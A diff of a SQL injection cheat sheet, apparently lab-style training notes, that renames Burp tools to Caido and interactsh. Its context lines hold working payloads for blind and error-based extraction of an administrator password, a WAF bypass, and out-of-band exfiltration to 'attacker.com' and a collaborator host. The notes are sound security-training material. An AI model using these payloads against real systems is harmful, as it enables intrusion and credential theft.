@@ -217,7 +217,7 @@ Used when the application returns different HTTP status codes on SQL errors vs. 
 -- Enumerate password length
 '||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 
--- Extract password char by char (Burp Intruder Cluster Bomb: position + charset)
+-- Extract password char by char (Caido Automate Cluster Bomb: position + charset)
 '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
 ```
 
@@ -260,7 +260,7 @@ Cookie: TrackingId=xyz'+AND+(SELECT 'a' FROM users WHERE username='administrator
 -- Determine password length
 Cookie: TrackingId=xyz'+AND+(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
 
--- Extract password character by character (Burp Intruder Sniper, positions 1–20, charset a-z0-9)
+-- Extract password character by character (Caido Automate Sniper, positions 1–20, charset a-z0-9)
 Cookie: TrackingId=xyz'+AND+SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
 ```
 
@@ -338,9 +338,9 @@ Exfiltrates data via a side channel (DNS, HTTP). Requires network egress from th
 ' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1)) FROM dual-- -
 ```
 
-**Oracle — DNS via EXTRACTVALUE + XXE (Burp Collaborator):**
+**Oracle — DNS via EXTRACTVALUE + XXE (interactsh/OAST):**
 
-Trigger DNS/HTTP interaction to Burp Collaborator or similar OOB receiver:
+Trigger DNS/HTTP interaction to interactsh/OAST or similar OOB receiver:
 
 ```sql
 -- Trigger OOB interaction (confirm vulnerability)
@@ -373,7 +373,7 @@ URL-encoded payload for cookie injection:
   ELSE NULL END FROM dual--
 ```
 
-Use Burp Intruder Battering Ram with character set a-z0-9 at each position; a collaborator interaction confirms the matching character.
+Use Caido Automate (single shared payload across positions) with character set a-z0-9 at each position; an OOB interaction (interactsh / Burp Collaborator) confirms the matching character.
 
 ---
 
@@ -474,7 +474,7 @@ id=1&id=2 UNION SELECT 1,2,3-- -
 
 When an endpoint accepts XML payloads (e.g., stock check POST body) and a WAF blocks standard SQL keywords, encode the payload with XML hex entities. The DB processes the decoded value after the WAF passes it:
 
-1. In Burp Repeater, send the standard payload in the XML body — receive `403 Attack detected`.
+1. In Caido Replay, send the standard payload in the XML body — receive `403 Attack detected`.
 2. Install the **Hackvertor** Burp extension.
 3. Wrap the injection in `<@hex_entities>...</@hex_entities>` tags.
 4. Burp encodes each character as `&#xNN;` before sending; the XML parser decodes it; the WAF never sees plaintext SQL keywords.
@@ -704,7 +704,7 @@ GET /filter?category=Gifts'+OR+1=1--
 -- Query becomes: SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1
 ```
 
-URL-encode the payload before forwarding in Burp Repeater (`Ctrl+U`).
+URL-encode the payload before forwarding in Caido Replay (`Ctrl+U`).
 
 ---
 
@@ -875,7 +875,7 @@ Cookie: TrackingId=xyz'+AND+(SELECT 'a' FROM users WHERE username='administrator
 Cookie: TrackingId=xyz'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a
 ```
 
-Automate with Burp Intruder: Sniper, Payload type=Simple list (a-z0-9), grep "Welcome back!" as success condition. Repeat for each of the 20 positions.
+Automate with Caido Automate: Sniper, Payload type=Simple list (a-z0-9), grep "Welcome back!" as success condition. Repeat for each of the 20 positions.
 
 ---
 
@@ -956,14 +956,14 @@ Use `pg_sleep(-1)` in the ELSE branch for faster false-path responses. Sort Intr
 ---
 
 #### Lab 16 — Blind SQL injection with out-of-band interaction
-**Technique:** Oracle EXTRACTVALUE/XXE DNS interaction to Burp Collaborator
+**Technique:** Oracle EXTRACTVALUE/XXE DNS interaction to interactsh/OAST
 
 ```sql
 -- Payload (URL-encoded for cookie)
 Cookie: TrackingId=xyz'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 
-After sending: click "Poll now" in Burp Collaborator — expect 4 DNS interactions. 200 OK response confirms the payload fired.
+After sending: click "Poll now" in interactsh/OAST — expect 4 DNS interactions. 200 OK response confirms the payload fired.
 
 ---
 
